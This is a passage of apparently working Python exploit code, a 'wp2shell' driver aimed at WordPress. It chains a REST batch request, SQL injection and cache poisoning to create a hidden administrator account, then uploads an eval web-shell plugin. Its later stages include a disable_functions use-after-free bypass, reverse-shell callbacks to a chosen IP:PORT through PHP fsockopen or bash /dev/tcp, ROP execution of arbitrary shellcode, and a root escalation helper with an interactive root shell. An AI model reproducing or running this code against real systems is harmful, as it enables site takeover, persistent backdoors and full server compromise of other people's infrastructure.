        raise ExploitError(f"{option} port must be between 1 and 65535")
    return f"{address}:{port}"


def execute_uaf_action(
    args: argparse.Namespace,
    target: Target,
    opener,
    eval_url: str,
) -> int:
    """Run the packaged post-exploit through the public base64 eval endpoint."""
    _, disabled, runtime = show_eval_runtime(
        target,
        opener,
        eval_url,
        allow_restricted_action=True,
    )
    if runtime is None:
        return 2
    validate_local_exploit_runtime(runtime, disabled)

    php_source, source_path, raw_size = load_local_exploit_source(
        args.uaf_file
    )
    encoded_size = len(base64.b64encode(php_source.encode()))
    if args.uaf_exec is not None:
        action_mode = "cmd"
        action_payload = args.uaf_exec
        if not action_payload:
            raise ExploitError("--uaf-exec cannot be empty")
        print("\n[*] Restricted command")
        print(f"[+] Command: {action_payload!r}")
    elif args.uaf_connect is not None:
        action_mode = "cb"
        action_payload = normalize_callback(args.uaf_connect, "--uaf-connect")
        if not runtime.get("fsockopen_available"):
            raise ExploitError("--uaf-connect requires PHP fsockopen()")
        print("\n[*] PHP callback")
        print(f"[+] Destination: {action_payload}")
        print(f"[+] Client timeout: {args.wait}s")
    else:
        action_mode = "bash_cb"
        action_payload = normalize_callback(args.uaf_bash_connect, "--uaf-bash-connect")
        print("\n[*] Bash callback")
        print(f"[+] Destination: {action_payload}")
        print("[!] Requires /bin/bash and outbound TCP")

    print(f"[+] Payload: {source_path.name} ({raw_size} bytes)")
    print(f"[*] Encoded payload: {encoded_size} bytes")
    print(f"[*] Action mode: {action_mode}")
    print("[*] Starting disable_functions bypass")
    print("[!] An incompatible PHP build may restart an FPM worker")
    sys.stdout.flush()

    ok, output = target.run_local_exploit_url(
        opener,
        eval_url,
        php_source,
        action_mode,
        action_payload,
    )
    if not ok:
        print("\n[-] The eval endpoint did not return its compatibility marker.", file=sys.stderr)
        print(f"    response: {output}", file=sys.stderr)
        return 2

    print(f"\n[+] {LOCAL_EXPLOIT_FILENAME} output:")
    for line in output.splitlines() or [""]:
        print(f"    {line}")
    error_match = re.search(r"WP2SHELL_SAFE_ERROR:([^\r\n]+)", output)
    if error_match:
        print(
            f"\n[-] Action rejected: {error_match.group(1)}",
            file=sys.stderr,
        )
        return 2
    if action_mode == "cmd":
        if "WP2SHELL_SAFE_CMD_BEGIN" not in output or "WP2SHELL_SAFE_CMD_END" not in output:
            print("\n[-] The command completion markers were not both returned.", file=sys.stderr)
            return 2
        print("\n[+] Restricted command completed")
    elif action_mode == "cb":
        expected = f"WP2SHELL_SAFE_CB_CLOSED:{action_payload}"
        if expected not in output:
            print("\n[-] The PHP callback close marker was not returned.", file=sys.stderr)
            return 2
        print("\n[+] PHP callback closed cleanly")
    else:
        expected = f"WP2SHELL_SAFE_BASH_CB_DISPATCHED:{action_payload}"
        if expected not in output:
            print("\n[-] The Bash callback dispatch marker was not returned.", file=sys.stderr)
            return 2
        print("\n[+] Bash callback dispatched")
    return 0


def execute_rop_action(
    args: argparse.Namespace,
    target: Target,
    opener,
    eval_url: str,
) -> int:
    """Run the packaged Serializable-UAF ROP driver with a caller-supplied PIC payload."""
    _, _, runtime = show_eval_runtime(
        target,
        opener,
        eval_url,
        allow_restricted_action=True,
    )
    if runtime is None:
        return 2
    validate_rop_runtime(runtime)

    php_source, source_path, raw_size = load_rop_driver_source(args.rop_file)
    pic_payload, payload_path = load_rop_payload(args.pic_file)
    encoded_driver_size = len(base64.b64encode(php_source.encode()))
    encoded_payload_size = len(base64.b64encode(pic_payload))

    print("\n[*] Serializable ROP payload")
    print(f"[+] Driver: {source_path.name} ({raw_size} bytes)")
    print(f"[+] Binary: {payload_path} ({len(pic_payload)} bytes)")
    print(f"[+] Binary SHA-256: {hashlib.sha256(pic_payload).hexdigest()}")
    print(f"[*] Encoded driver: {encoded_driver_size} bytes")
    print(f"[*] Encoded payload: {encoded_payload_size} bytes")
    print("[!] Payload must be raw x86_64 position-independent code")
    print("[*] Starting dynamic gadget discovery and ROP dispatch")
    sys.stdout.flush()

    ok, output = target.run_rop_url(
        opener,
        eval_url,
        php_source,
        pic_payload,
    )
    if not ok:
        print("\n[-] The eval endpoint did not return its compatibility marker.", file=sys.stderr)
        print(f"    response: {output}", file=sys.stderr)
        return 2

    print(f"\n[+] {ROP_DRIVER_FILENAME} output:")
    for line in output.splitlines() or [""]:
        print(f"    {line}")
    error_match = re.search(r"WP2SHELL_ROP_ERROR:([^\r\n]+)", output)
    if error_match:
        print(f"\n[-] ROP driver rejected the payload: {error_match.group(1)}", file=sys.stderr)
        return 2
    if "WP2SHELL_ROP_DISPATCHING" not in output:
        print("\n[-] The ROP dispatch marker was not returned.", file=sys.stderr)
        return 2
    if "WP2SHELL_ROP_RETURNED" in output:
        print("\n[+] ROP payload returned to the driver")
    else:
        print("\n[+] ROP payload dispatched; no return marker was observed")
    return 0


def _dispatch_root_payload(
    target: Target,
    opener,
    eval_url: str,
    php_source: str,
    pic_payload: bytes,
) -> threading.Thread:
    """Dispatch without blocking the in-memory root control poller.

    The ROP payload replaces the PHP worker serving this request. Some stacks
    leave that HTTP connection open until the client timeout even though the
    helper is already listening on its loopback control socket. Keep the
    request alive in a daemon thread and let the main thread observe helper
    state immediately.
    """

    def dispatch() -> None:
        try:
            target._request_eval_url(
                opener,
                eval_url,
                php_source,
                request_parameters={
                    "wpr_pic": base64.b64encode(pic_payload).decode("ascii"),
                },
                use_post=True,
            )
        except (
            OSError,
            urllib.error.URLError,
            TimeoutError,
            http.client.IncompleteRead,
            http.client.HTTPException,
        ):
            # The payload replaces the current PHP worker with the helper ELF.
            # A closed upstream response is expected on the success path.
            return

    worker = threading.Thread(
        target=dispatch,
        name="wp2shell-root-dispatch",
        daemon=True,
    )
    worker.start()
    return worker


def _root_control_request(
    target: Target,
    opener,
    eval_url: str,
    port: int,
    token: str,
    operation: str,
    payload: bytes = b"",
) -> str | None:
    packet = token.encode() + b"\n" + operation.encode() + b"\n" + payload
    encoded_packet = base64.b64encode(packet).decode("ascii")
    ok, output = target.run_php_url(
        opener,
        eval_url,
        "try {"
        "$packet=isset($_REQUEST['wpr_ctl']) ? "
        "base64_decode((string) $_REQUEST['wpr_ctl'], true) : false;"
        "if (!is_string($packet)) { echo ''; return; }"
        f"$s=@fsockopen('127.0.0.1',{port},$errno,$errstr,1);"
        "if (!$s) {"
        "$msg='WP2SHELL_ROOT_CONNECT_ERROR:'.(string)$errno.':'.(string)$errstr.\"\\n\";"
        "echo base64_encode($msg);"
        "return;"
        "}"
        "@stream_set_timeout($s, 2);"
        "@fwrite($s,$packet);"
        "if (function_exists('stream_socket_shutdown')) { @stream_socket_shutdown($s, STREAM_SHUT_WR); }"
        "$buf='';"
        "for ($i=0; $i<256 && !feof($s); $i++) {"
        "$chunk=@fread($s,8192);"
        "if ($chunk === false) break;"
        "if ($chunk === '') {"
        "$meta=@stream_get_meta_data($s);"
        "if (is_array($meta) && !empty($meta['timed_out'])) break;"
        "@usleep(10000);"
        "continue;"
        "}"
        "$buf.=$chunk;"
        "}"
        "@fclose($s);"
        "echo base64_encode($buf);"
        "} catch (Throwable $e) { echo ''; }",
        request_parameters={"wpr_ctl": encoded_packet},
        use_post=True,
        request_timeout=min(max(float(target.timeout), 1.0), 10.0),
    )
    if not ok or not output:
        return None
    try:
        return base64.b64decode(output, validate=True).decode("utf-8", "replace")
    except (ValueError, binascii.Error):
        return None


def interactive_root_shell(
    target: Target,
    opener,
    eval_url: str,
    port: int,
    token: str,
    initial: str,
) -> None:
    if initial:
        print(initial, end="" if initial.endswith("\n") else "\n")
    while True:
        try:
            command = input("root@wp2shell> ")
        except (EOFError, KeyboardInterrupt):
            print()
            command = "exit"
        if not command.strip():
            continue
        if command.strip().lower() in {"exit", "quit"}:
            _root_control_request(target, opener, eval_url, port, token, "EXIT")
            break
        output = _root_control_request(
            target,
            opener,
            eval_url,
            port,
            token,
            "CMD",
            command.encode(),
        )
        if output is None:
            print("[root shell write failed]")
            continue
        if output:
            print(output, end="" if output.endswith("\n") else "\n")


def execute_root_action(
    args: argparse.Namespace,
    target: Target,
    opener,
    eval_url: str,
) -> int:
    """Pack and dispatch the prebuilt copy-fail helper through the ROP driver."""
    _, _, runtime = show_eval_runtime(
        target,
        opener,
        eval_url,
        allow_restricted_action=True,
    )
    if runtime is None:
        return 2
    validate_rop_runtime(runtime)
    if not runtime.get("fsockopen_available"):
        raise ExploitError(
            "--priv-* requires PHP fsockopen() for the loopback helper transport"
        )
    php_source, source_path, raw_size = load_rop_driver_source(args.rop_file)
    pic_payload, metadata = build_root_pic_payload(args)

    print("\n[*] Root payload")
    print(f"[+] Driver: {source_path.name} ({raw_size} bytes)")
    print(f"[+] Helper ELF: {metadata['helper_binary']} ({metadata['helper_size']} bytes)")
    print(f"[+] Launcher template: {metadata['launcher_template']}")
    print(f"[+] PIC launcher: {metadata['payload_size']} bytes")
    print(f"[+] PIC SHA-256: {metadata['payload_sha256']}")
    print(f"[+] Control endpoint: 127.0.0.1:{metadata['control_port']}")
    print("[+] Remote staging: memfd")
    if metadata["mode"] == "cmd":
        print(f"[+] Root command: {args.priv_exec!r}")
    else:
        print("[+] Root shell transport: loopback socket")
    print("[*] Dispatching copy-fail launcher through the ROP path")
    print("[!] The current PHP worker may exit while the helper takes over")
    print("[*] On-target helper files, FIFO files, and ROP trace files are disabled")
    sys.stdout.flush()

    _dispatch_root_payload(
        target,
        opener,
        eval_url,
        php_source,
        pic_payload,
    )
    deadline = time.monotonic() + max(args.wait, 1)

    if metadata["mode"] == "cmd":
        last_connect_error: str | None = None
        while time.monotonic() < deadline:
            output = _root_control_request(
                target,
                opener,
                eval_url,
                int(metadata["control_port"]),
                str(metadata["control_token"]),
                "GET",
            )
            if output is not None and ROOT_RESULT_MARKER in output:
                print("\n[+] Root command output:")
                for line in output.splitlines() or [""]:
                    print(f"    {line}")
                return 0
            if output is not None and ROOT_CONNECT_ERROR_MARKER in output:
                last_connect_error = output.strip()
            time.sleep(0.5)
        print("\n[-] Root command result was not observed before timeout.", file=sys.stderr)
        print(
            f"    Expected loopback listener: 127.0.0.1:{metadata['control_port']}",
            file=sys.stderr,
        )
        if last_connect_error:
            print(f"    Last loopback connect result: {last_connect_error}", file=sys.stderr)
        return 2

    last_connect_error = None
    while time.monotonic() < deadline:
        output = _root_control_request(
            target,
            opener,
            eval_url,
            int(metadata["control_port"]),
            str(metadata["control_token"]),
            "PING",
        )
        if output is not None and ROOT_SHELL_READY_MARKER in output:
            initial = output.split(ROOT_SHELL_READY_MARKER, 1)[1].lstrip("\n")
            print("\n[+] Root shell control socket is ready")
            print(f"[+] Loopback listener: 127.0.0.1:{metadata['control_port']}")
            interactive_root_shell(
                target,
                opener,
                eval_url,
                int(metadata["control_port"]),
                str(metadata["control_token"]),
                initial,
            )
            return 0
        if output is not None and ROOT_CONNECT_ERROR_MARKER in output:
            last_connect_error = output.strip()
        time.sleep(0.5)
    print("\n[-] Root shell control socket was not observed before timeout.", file=sys.stderr)
    print(
        f"    Expected loopback listener: 127.0.0.1:{metadata['control_port']}",
        file=sys.stderr,
    )
    if last_connect_error:
        print(f"    Last loopback connect result: {last_connect_error}", file=sys.stderr)
    return 2


def execute_eval_command(
    target: Target,
    opener,
    eval_url: str,
    command: str,
) -> bool:
    print(f"[*] Command: {command!r}")
    ok, output = target.run_shell_command_url(opener, eval_url, command)
    if not ok:
        print("\n[-] The eval endpoint was reached, but passthru execution failed.", file=sys.stderr)
        print(f"    response: {output}", file=sys.stderr)
        return False
    print("[+] Output:")
    for line in output.splitlines() or [""]:
        print(f"    {line}")
    return True


def interactive_eval_shell(target: Target, opener, eval_url: str) -> None:
    print("\n[+] Repeated-command shell (type exit or press Ctrl-D to leave)")
    while True:
        try:
            command = input("wp2shell> ")
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if command.strip().lower() in {"exit", "quit"}:
            break
        if not command.strip():
            continue
        ok, output = target.run_shell_command_url(opener, eval_url, command)
        if not ok:
            print(f"[shell request failed] {output}")
            continue
        print(output)


def attach_eval_shell(args: argparse.Namespace, target: Target, eval_url: str) -> int:
    """Attach to an existing public eval endpoint without exploiting WordPress."""
    parts = urllib.parse.urlsplit(eval_url)
    if parts.scheme not in {"http", "https"} or not parts.netloc:
        raise ExploitError("--attach-url must be an absolute HTTP or HTTPS URL")
    opener = target.public_opener()
    state, detail = target.probe_eval_url(opener, eval_url)
    if state != "compatible":
        raise ExploitError(
            f"the supplied eval endpoint was not compatible ({state}: {detail})"
        )
    print("[+] Existing endpoint accepted")
    print("[*] WordPress exploitation skipped")
    if any(value is not None for value in (args.uaf_exec, args.uaf_connect, args.uaf_bash_connect)):
        return execute_uaf_action(args, target, opener, eval_url)
    if args.priv_exec is not None or args.priv_shell:
        return execute_root_action(args, target, opener, eval_url)
    if args.pic_file is not None:
        return execute_rop_action(args, target, opener, eval_url)
    shell_allowed, _, _ = show_eval_runtime(target, opener, eval_url)
    if not shell_allowed:
        return 2
    if args.exec_cmd is not None and not execute_eval_command(
        target, opener, eval_url, args.exec_cmd
    ):
        return 2
    interactive_eval_shell(target, opener, eval_url)
    return 0


def use_existing_eval(
    args: argparse.Namespace,
    target: Target,
    opener,
    eval_url: str,
    command: str,
) -> int:
    print("[+] Existing WP2Shell endpoint found")
    print("[*] WordPress exploitation skipped")
    print("[!] Use --fresh to create a new administrator and plugin")
    if any(value is not None for value in (args.uaf_exec, args.uaf_connect, args.uaf_bash_connect)):
        return execute_uaf_action(args, target, opener, eval_url)
    if args.priv_exec is not None or args.priv_shell:
        return execute_root_action(args, target, opener, eval_url)
    if args.pic_file is not None:
        return execute_rop_action(args, target, opener, eval_url)
    if args.shell:
        shell_allowed, _, _ = show_eval_runtime(target, opener, eval_url)
        if not shell_allowed:
            return 2
    else:
        print(f"[+] Endpoint: {eval_url}")
        print("[*] Parameter: e=<base64 PHP without <?php>")
    if not execute_eval_command(target, opener, eval_url, command):
        return 2
    if args.shell:
        interactive_eval_shell(target, opener, eval_url)
    return 0


def _exploit(args: argparse.Namespace) -> int:
    target = Target(args.target, args.wait, args.skip_tls_verify)
    uaf_action = any(
        value is not None for value in (args.uaf_exec, args.uaf_connect, args.uaf_bash_connect)
    )
    root_action = args.priv_exec is not None or args.priv_shell
    rop_action = args.pic_file is not None
    if uaf_action and args.shell:
        raise ExploitError("--uaf-* actions cannot be combined with --shell")
    if uaf_action and args.stop_after_admin:
        raise ExploitError("--uaf-* actions cannot be combined with --stop-after-admin")
    if rop_action and args.shell:
        raise ExploitError("--pic-file cannot be combined with --shell")
    if rop_action and args.stop_after_admin:
        raise ExploitError("--pic-file cannot be combined with --stop-after-admin")
    if root_action and args.shell:
        raise ExploitError("--priv-* actions cannot be combined with --shell")
    if root_action and args.stop_after_admin:
        raise ExploitError("--priv-* actions cannot be combined with --stop-after-admin")
    if args.uaf_file and not uaf_action:
        raise ExploitError(
            "--uaf-file is meaningful only with a --uaf-* action"
        )
    if args.rop_file and not rop_action:
        if not root_action:
            raise ExploitError("--rop-file is meaningful only with --pic-file or --priv-*")
    if args.helper_elf and not root_action:
        raise ExploitError("--helper-elf is meaningful only with a --priv-* action")
    if args.launcher_pic and not root_action:
        raise ExploitError("--launcher-pic is meaningful only with a --priv-* action")
    if args.attach_url:
        if args.stop_after_admin:
            raise ExploitError("--attach-url cannot be combined with --stop-after-admin")
        if args.fresh:
            raise ExploitError("--attach-url already skips exploitation; do not combine it with --fresh")
        return attach_eval_shell(args, target, args.attach_url)

    quiet = bool(getattr(args, "quiet", False))

    def progress(message: str = "") -> None:
        if not quiet:
            print(message)

    token = secrets.token_hex(5)
    command = args.exec_cmd or DEFAULT_COMMAND
    username = args.admin_user or f"w2s_{token}"
    password = args.admin_pass or f"W2s!{secrets.token_urlsafe(14)}"
    email = args.admin_mail or f"{username}@example.invalid"

    public_opener = target.public_opener()
    default_eval_url = target.eval_url(PLUGIN_BASE_SLUG)
    endpoint_state, endpoint_detail = target.probe_eval_url(
        public_opener, default_eval_url
    )
    plugin_slug = PLUGIN_BASE_SLUG
    if endpoint_state == "compatible" and not args.fresh:
        if args.stop_after_admin:
            raise ExploitError(
                "an existing eval endpoint was found, so creating another administrator "
                "would be re-exploitation; pass --fresh to proceed"
            )
        return use_existing_eval(
            args, target, public_opener, default_eval_url, command
        )
    if endpoint_state == "occupied" and not args.fresh:
        raise ExploitError(
            f"the default plugin path {default_eval_url} already exists but is not a "
            f"compatible endpoint ({endpoint_detail}); pass --fresh to use a session suffix"
        )
    if endpoint_state in {"compatible", "occupied"} and args.fresh:
        for _ in range(8):
            candidate = f"{PLUGIN_BASE_SLUG}-{secrets.token_hex(3)}"
            candidate_url = target.eval_url(candidate)
            candidate_state, _ = target.probe_eval_url(public_opener, candidate_url)
            if candidate_state == "missing":
                plugin_slug = candidate
                break
        else:
            raise ExploitError("could not allocate an unused session-suffixed plugin path")
        print(
            f"[!] Existing plugin path detected; --fresh selected session {plugin_slug!r}"
        )

    progress("[*] Target check")
    index = target.rest_index()
    site_home = str(index.get("home") or index.get("url") or args.target).rstrip("/")
    progress(f"[+] Home: {site_home}")
    version = target.detect_wordpress_version(site_home)
    progress(f"[+] WordPress: {version or 'version not exposed'}")
    if quiet:
        print(f"WordPress version: {version or 'not exposed'}")
        print("Creating new administrator...")
    database = scalar_probe(
        target,
        "DATABASE()",
        label="full-row SQL/projection probe",
        projection_hint=True,
    )
    progress(f"[+] SQL projection: 23 columns ({database!r})")

    progress("\n[*] Site discovery")
    prefix = discover_site_prefix(target, args.db_prefix, site_home)
    validate_posts_schema(target, prefix)
    admin_id, users_table = discover_administrator(target, prefix)
    public_link = target.public_content_link()
    progress(f"[+] Table prefix: {prefix!r}")
    progress(f"[+] Administrator source: user {admin_id} in {users_table}")
    progress(f"[+] Embed target: {public_link}")

    existing = scalar_probe(
        target,
        f"SELECT COUNT(*) FROM {users_table} WHERE user_login={hx(username)}",
        label="new-username availability probe",
    )
    if existing != "0":
        raise ExploitError(
            f"requested username {username!r} already exists in {users_table}; choose another"
        )

    roles = ["primary", "changeset", "primary_peer", "nav", "parse", "parse_peer"]
    embed_urls = {
        role: add_query_marker(public_link, f"{token}-{role}") for role in roles
    }

    progress("\n[*] Cache preparation")
    cache_rows, seed_responses = seed_oembed_rows(
        target, prefix, embed_urls, admin_id
    )
    seed_statuses = ", ".join(str(status) for status, _ in seed_responses)
    seed_bytes = sum(len(response) for _, response in seed_responses)
    progress(f"[+] Seed status: {seed_statuses}")
    progress(f"[+] Seed data: {seed_bytes} bytes")
    progress("[+] Cache IDs:")
    progress("    " + ", ".join(
        f"{role}={cache_rows[role][0]}" for role in roles[:3]
    ))
    progress("    " + ", ".join(
        f"{role}={cache_rows[role][0]}" for role in roles[3:]
    ))

    progress("\n[*] Privilege trigger")
    poison = build_poison(
        prefix,
        cache_rows,
        username,
        make_uuid(token),
        admin_id,
        users_table,
    )
    fire = build_fire(embed_urls["primary"], admin_id)
    user_body = {
        "username": username,
        "password": password,
        "email": email,
        "roles": ["administrator"],
        "sidebar": "wp_inactive_widgets",
    }

    # After the malformed item, each request object is dispatched through the
    # following request's matched handler:
    #   widget(user body) -> users#create
    #   users             -> widgets#create (irrelevant)
    #   widget(SQL poison)-> posts#get_items
    #   posts             -> widgets#create (irrelevant)
    #   widget(SQL fire)  -> posts#get_items
    inner = [
        malformed(),
        {
            "method": "POST", "path": "/wp/v2/widgets",
            "body": user_body,
        },
        {
            "method": "POST", "path": "/wp/v2/users",
            "body": user_body,
        },
        widget_carrier(poison),
        {"method": "GET", "path": "/wp/v2/posts"},
        widget_carrier(fire),
        {"method": "GET", "path": "/wp/v2/posts"},
    ]
    try:
        attack_status, attack_response = target.batch(wrap_inner(inner))
        progress(f"[+] Trigger response: HTTP {attack_status}")
        progress(f"[+] Response size: {len(attack_response)} bytes")
    except (OSError, urllib.error.URLError, TimeoutError) as exc:
        # The reentrant serve_request() terminates from inside the original
        # dispatch. Some reverse proxies surface that as a closed/bad upstream
        # response even though the nested database write has committed.
        attack_status = 0
        attack_response = f"transport ended during reentrant dispatch: {exc}"
        progress("[!] Connection ended during the nested dispatch")
        progress("[*] Checking the persistent result")

    # The nested rest_api_loaded()->serve_request() call ends in die(), so its
    # response can be malformed/concatenated. The persistent result is decisive.
    progress("\n[*] Administrator verification")
    created = scalar_probe(
        target,
        f"SELECT COUNT(*) FROM {users_table} WHERE user_login={hx(username)}",
        label="post-attack administrator probe",
    )
    if created != "1":
        try:
            diagnostic = attack_stage_diagnostic(target, prefix, cache_rows)
        except ExploitError as exc:
            diagnostic = f"the follow-up stage diagnostic also failed: {exc}"
        print("\n[-] The nested administrator creation did not persist.", file=sys.stderr)
        print(f"    Diagnostic: {diagnostic}", file=sys.stderr)
        if seed_responses:
            print(
                "    Last seed response prefix:",
                seed_responses[-1][1][:500],
                file=sys.stderr,
            )
        print("    Attack response prefix:", attack_response[:1200], file=sys.stderr)
        return 1

    progress("[+] Administrator row created")
    progress("[*] Checking WordPress login")
    admin_opener = None
    for attempt in range(3):
        admin_opener = target.admin_session(username, password)
        if admin_opener:
            break
        time.sleep(1)

    if not admin_opener:
        print("\n[-] The administrator login did not succeed.", file=sys.stderr)
        print(
            "    The user row exists, so the exploit write succeeded. Check canonical "
            "HTTP/HTTPS host, login-security plugins, and cookie/redirect policy.",
            file=sys.stderr,
        )
        print("    Attack response prefix:", attack_response[:1000], file=sys.stderr)
        return 1

    if quiet:
        print("Administrator created")
        print(f"Username: {username}")
        print(f"Password: {password}")
        print(f"Email:    {email}")
    else:
        print("\n[+] Administrator login accepted")
        print(f"    User:  {username}")
        print(f"    Pass:  {password}")
        print(f"    Email: {email}")

    if args.stop_after_admin:
        return 0

    progress("\n[*] WP2Shell installation")
    progress(f"[+] Plugin slug: {plugin_slug}")
    upload_ok, upload_detail = target.upload_eval_shell(admin_opener, plugin_slug)
    if not upload_ok:
        print("\n[-] Administrator creation worked, but plugin execution did not.", file=sys.stderr)
        print(f"    upload response: {upload_detail}", file=sys.stderr)
        return 2

    eval_url = target.eval_url(plugin_slug)
    if uaf_action:
        return execute_uaf_action(args, target, admin_opener, eval_url)
    if root_action:
        return execute_root_action(args, target, admin_opener, eval_url)
    if rop_action:
        return execute_rop_action(args, target, admin_opener, eval_url)
    if args.shell:
        shell_allowed, _, _ = show_eval_runtime(target, admin_opener, eval_url)
        if not shell_allowed:
            return 2
    else:
        print(f"[+] Endpoint: {eval_url}")
        print("[*] Parameter: e=<base64 PHP without <?php>")

    if not execute_eval_command(target, admin_opener, eval_url, command):
        return 2
    print("\n[+] Command execution confirmed")
    print(f"[+] Endpoint: {eval_url}")

    if args.shell:
        interactive_eval_shell(target, admin_opener, eval_url)
    return 0


def exploit(args: argparse.Namespace) -> int:
    try:
        return _exploit(args)
    except ExploitError as exc:
        print(f"\n[-] {exc}", file=sys.stderr)
        return 1
    except (OSError, urllib.error.URLError, TimeoutError) as exc:
        print(f"\n[-] Network/transport failure: {exc}", file=sys.stderr)
        return 1


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Full wp2shell driver: WordPress exploit, eval endpoint, "
            "Serializable-UAF actions (--uaf-*), native ROP (--pic-file), "
            "and root helper actions (--priv-*)."
        ),
    )
    parser.add_argument("target", nargs="?", default=DEFAULT_BASE)
    parser.add_argument(
        "--db-prefix",
        default="auto",
        help="WordPress site table prefix (default: discover it through the SQL injection)",
    )
    parser.add_argument("--admin-user")
    parser.add_argument("--admin-pass")
    parser.add_argument("--admin-mail")
    parser.add_argument("--wait", type=int, default=120)
    parser.add_argument(
        "--skip-tls-verify", action="store_true",
        help="disable TLS certificate verification (for self-signed lab HTTPS)",
    )
    action = parser.add_mutually_exclusive_group()
    action.add_argument(
        "--exec-cmd",
        default=None,
        help=f"command to run after plugin upload (default: {DEFAULT_COMMAND!r})",
    )
    action.add_argument(
        "--uaf-exec",
        metavar="COMMAND",
        help=(
            "run one command through packaged local_exploit.php when system is "
            "disabled"
        ),
    )
    action.add_argument(
        "--uaf-connect",
        metavar="IP:PORT",
        help="PHP fsockopen callback shell using the recovered system handler",
    )
    action.add_argument(
        "--uaf-bash-connect",
        metavar="IP:PORT",
        help="detached /bin/bash /dev/tcp callback through the recovered system handler",
    )
    action.add_argument(
        "--pic-file",
        metavar="PATH",
        help="execute a raw x86_64 PIC payload through the packaged Serializable ROP driver",
    )
    action.add_argument(
        "--priv-exec",
        metavar="COMMAND",
        help="pack the prebuilt copy-fail launcher, then run one root command",
    )
    action.add_argument(
        "--priv-shell",
        action="store_true",
        help="pack the prebuilt copy-fail launcher, then attach through a loopback socket",
    )
    parser.add_argument(
        "--uaf-file",
        metavar="PATH",
        help=(
            f"path to the packaged adapted {LOCAL_EXPLOIT_FILENAME} "
            "(default: beside this script)"
        ),
    )
    parser.add_argument(
        "--rop-file",
        metavar="PATH",
        help=f"path to the packaged {ROP_DRIVER_FILENAME} driver (default: beside this script)",
    )
    parser.add_argument(
        "--helper-elf",
        metavar="PATH",
        help=(
            f"path to the prebuilt {ROOT_HELPER_BINARY_FILENAME} ELF "
            f"(default: {ROOT_BUILD_DIRNAME}/{ROOT_HELPER_BINARY_FILENAME})"
        ),
    )
    parser.add_argument(
        "--launcher-pic",
        metavar="PATH",
        help=(
            f"path to the prebuilt {ROOT_LAUNCHER_FILENAME} template "
            f"(default: {ROOT_BUILD_DIRNAME}/{ROOT_LAUNCHER_FILENAME})"
        ),
    )
    parser.add_argument(
        "--stop-after-admin", action="store_true",
        help="stop after proving reentrant administrator creation",
    )
    parser.add_argument(
        "--shell", action="store_true",
        help="enter a repeated-command loop after proving RCE",
    )
    parser.add_argument(
        "--attach-url",
        help="attach directly to an existing eval endpoint without exploiting WordPress",
    )
    parser.add_argument(
        "--fresh",
        action="store_true",
        help="re-exploit even when the generic endpoint exists; use a session-suffixed plugin",
    )
    return parser.parse_args()


if __name__ == "__main__":
    raise SystemExit(exploit(parse_args()))
